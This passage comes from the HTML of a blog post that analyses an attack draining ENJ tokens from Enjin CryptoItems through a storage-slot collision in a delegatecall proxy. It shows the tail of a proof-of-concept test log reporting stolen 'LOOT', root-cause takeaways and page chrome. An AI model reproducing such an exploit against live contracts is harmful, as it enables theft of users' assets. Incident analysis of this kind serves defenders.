+</span></span><span class="line"><span class="cl">  owner of record idA now  :
+</span></span><span class="line"><span class="cl">  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
+</span></span><span class="line"><span class="cl">  == STEP 5: melt -&gt; ENJ ==
+</span></span><span class="line"><span class="cl">  attacker ENJ after melt  :
+</span></span><span class="line"><span class="cl">  3000000000000000000000000
+</span></span><span class="line"><span class="cl">  ADAPTER ENJ after melt   :
+</span></span><span class="line"><span class="cl">  6852235680834846022159376
+</span></span><span class="line"><span class="cl">  LOOT: 3,000,000 ENJ, paid from the ADAPTER reserve, NFT of VICTIM burned.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.98s (746.87ms CPU time)</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h2 class="heading-element" id="6-key-takeaways"><span>6. Key Takeaways</span>
+  <a href="#6-key-takeaways" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>The fundamental flaw in this architecture is the implicit storage layout assumption across <code>delegatecall</code> boundaries.</p>
+<ol>
+<li><strong>Uncoordinated Storage in Delegatecall Proxies:</strong> <code>NF_TEMPLATE</code> assumes slot 1 is <code>_acceptManager</code> and slot 2 is <code>delegates</code>. The implementation <code>0x24591e79</code> assumes slot 1 is <code>_ownerOf</code> and slot 2 is <code>_totalSupply</code>. When two contracts with unrelated storage layouts are combined under <code>delegatecall</code>, state writes quietly clobber security-critical access control variables.</li>
+<li><strong>Unguarded <code>initialize()</code> on Shared Implementations:</strong> <code>initialize()</code> lacked any caller verification, assuming it would only be executed once upon standalone contract creation. In a proxy routing context where slot 2 was perpetually zero, the initialization guard was permanently broken.</li>
+<li><strong>Cascading Gateway Trust:</strong> The transfer gateway <code>0x41c1df0e</code> placed absolute trust in any contract registered in <code>mapping_25</code>. Because the adapter shell was a mini-proxy inheriting <code>NF_TEMPLATE</code>&rsquo;s routing table, poisoning the template cascaded into full authorization to move user assets.</li>
+</ol></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="更新于 2026-09-02 07:11:00">更新于 2026-09-02&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" data-title="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy" data-hashtags="attack"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" data-hashtag="attack"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" data-title="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy"><i class="fa-brands fa-hacker-news" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" data-title="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" data-title="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/attack/" class="post-tag" title="标签 - Attack">Attack</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/when-a-uniswap-v3-vault-prices-its-own-shares-at-the-edge-of-its-range/" class="post-nav-item" rel="prev" title="When a Uniswap V3 Vault Prices Its Own Shares at the Edge of Its Range"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>When a Uniswap V3 Vault Prices Its Own Shares at the Edge of Its Range</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#1-system-overview--architecture">1. System Overview &amp; Architecture</a></li>
+    <li><a href="#2-the-vulnerability-storage-slot-collision-in-managed-proxy">2. The Vulnerability: Storage-Slot Collision in Managed Proxy</a></li>
+    <li><a href="#3-from-takeover-to-loot-route-poisoning--gateway-abuse">3. From Takeover to Loot: Route Poisoning &amp; Gateway Abuse</a>
+      <ul>
+        <li><a href="#step-1-route-poisoning-via-updatecontract">Step 1: Route Poisoning via <code>updateContract</code></a></li>
+        <li><a href="#step-2-deploying-a-per-item-adapter-shell">Step 2: Deploying a Per-Item Adapter Shell</a></li>
+        <li><a href="#step-3-re-entering-the-transfer-gateway-as-the-shell">Step 3: Re-entering the Transfer Gateway as the Shell</a></li>
+        <li><a href="#step-4-melting-the-stolen-nft-for-enj">Step 4: Melting the Stolen NFT for ENJ</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-the-real-incident-6-targets-and-523m-enj">4. The Real Incident: 6 Targets and 5.23M ENJ</a></li>
+    <li><a href="#5-reproduction">5. Reproduction</a>
+      <ul>
+        <li><a href="#maliciousshelllogicsol"><code>MaliciousShellLogic.sol</code></a></li>
+        <li><a href="#enjinnfthackpoctsol"><code>EnjinNftHackPoC.t.sol</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#6-key-takeaways">6. Key Takeaways</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="目录"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/32ec4dc13ebf9e486f3329f2937dc091.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
